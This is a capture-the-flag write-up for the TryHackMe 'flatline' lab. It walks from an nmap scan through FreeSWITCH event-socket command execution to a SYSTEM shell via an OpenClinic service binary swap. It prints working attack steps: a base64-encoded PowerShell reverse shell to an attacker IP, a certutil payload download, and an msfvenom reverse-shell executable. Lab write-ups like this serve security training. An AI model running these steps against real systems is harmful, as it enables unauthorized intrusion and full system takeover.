# flatline

### https://tryhackme.com/room/flatline
### Hein Andre Grønnestad
### 2022-03-08

---

## NMAP

A quick `nmap` search show a couple of services running on the target machine:

- 3389: Microsoft Terminal Services
- 8021: FreeSWITCH mod_event_socket

```bash
$ nmap -vv -Pn -sV 10.10.87.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 14:01 CET
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 14:01
Completed Parallel DNS resolution of 1 host. at 14:01, 1.03s elapsed
Initiating Connect Scan at 14:01
Scanning 10.10.87.10 [1000 ports]
Discovered open port 3389/tcp on 10.10.87.10
Discovered open port 8021/tcp on 10.10.87.10
Completed Connect Scan at 14:01, 5.87s elapsed (1000 total ports)
Initiating Service scan at 14:01
Scanning 2 services on 10.10.87.10
Completed Service scan at 14:01, 8.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.87.10.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Nmap scan report for 10.10.87.10
Host is up, received user-set (0.049s latency).
Scanned at 2022-03-08 14:01:45 CET for 14s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON  VERSION
3389/tcp open  ms-wbt-server    syn-ack Microsoft Terminal Services
8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds
```

## FreeSWITCH mod_event_socket

I've never heard about `FreeSWITCH mod_event_socket` before, but a quick search using `searchsploit` reveals a promising RCE vulnerability.

```bash
$ searchsploit FreeSWITCH
------------------------------------- ---------------------------------
 Exploit Title                       |  Path
------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Ex | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Executio | windows/remote/47799.txt
------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


$ searchsploit -m 47799
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
File Type: Python script, ASCII text executable

Copied to: /home/hag/thm/flatline/47799.txt
```

## Remote Code Execution

The `47799.txt` file is actually a Python script. Using the script, we can run commands on the remote machine and we get the command output back as well.

```bash
$ mv 47799.txt exploit.py

$ python3 exploit.py 10.10.87.10 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

## 🚩 Flag 1: `user.txt`

As we can see when running `whoami`, we are currently running commands as the `win-eom4pk0578n\nekrotic` user. We should be able to retrieve the `user.txt` flag at this point.

```powershell
$ python3 exploit.py 10.10.87.10 "dir c:\users\Nekrotic\Desktop"
Authenticated
Content-Type: api/response
Content-Length: 374

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,602,835,968 bytes free

$ python3 exploit.py 10.10.87.10 "type c:\users\Nekrotic\Desktop\user.txt"
Authenticated
Content-Type: api/response
Content-Length: 38

THM{64****************************26}
```

The `root.txt` flag is not accessible to this user, so we must elevate our privileges.

## Reverse Shell

Let's try and get a reverse shell as the `win-eom4pk0578n\nekrotic` user first, that will make privilege escalation easier.

> Reverse shell created using https://www.revshells.com/; template `Powershell #3 (Base64)`.

### Set up the listener

```bash
$ nc -lvnp 4242
listening on [any] 4242 ...
```

### Run the RCE exploit with the reverse shell payload

```bash
$ python3 exploit.py 10.10.87.10 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAxAC4AMwAxAC4AMQA5ADkAIgAsADQAMgA0ADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

We get a connection back to our attacker machine:

```powershell
connect to [10.11.31.199] from (UNKNOWN) [10.10.87.10] 49797
PS C:\Program Files\FreeSWITCH>
```

## Privilege Escalation

Looking around at the target, we found `PS C:\projects\openclinic>` which looks interesting.

```
$ searchsploit openclinic
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
OpenClinic GA 5.194.18 - Local Privilege Es | windows/local/50448.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Looks like we have a LPE vulnerability.

### Create payload

PoC taken from `windows/local/50448.txt`:

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.31.199 LPORT=9999 -f exe
 > rs.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

### Download payload to target
```
certutil.exe -urlcache -f http://10.11.31.199:8080/rs.exe rs.exe
```

### Replacing `mysqld.exe` and restarting services

Stop the `OpenClinicMySQL` service so we can replace `mysqld.exe` with the reverse shell:

```
PS C:\projects\openclinic\mariadb\bin> net stop OpenClinicMySQL
The OpenClinicMySQL service is stopping.
The OpenClinicMySQL service was stopped successfully.

PS C:\projects\openclinic\mariadb\bin> rm mysqld.exe

PS C:\projects\openclinic\mariadb\bin> cp C:\projects\openclinic\rs.exe mysqld.exe
```

Start the new listener:

```
$ nc -lvnp 9999
listening on [any] 9999 ...
```

Restart the `OpenClinicMySQL` service to run our reverse shell on the target:
```
PS C:\projects\openclinic\mariadb\bin> net start OpenClinicMySQL
```

### Successful Privilege Escalation

We got a connection from the target. We are now `nt authority\system` and can read `root.txt`:

```
connect to [10.11.31.199] from (UNKNOWN) [10.10.87.10] 49861
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

c:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,430,775,296 bytes free

```

## 🚩 Flag 2: `root.txt`

```
c:\Users\Nekrotic\Desktop>type root.txt

type root.txt
THM{8c****************************5e}
```
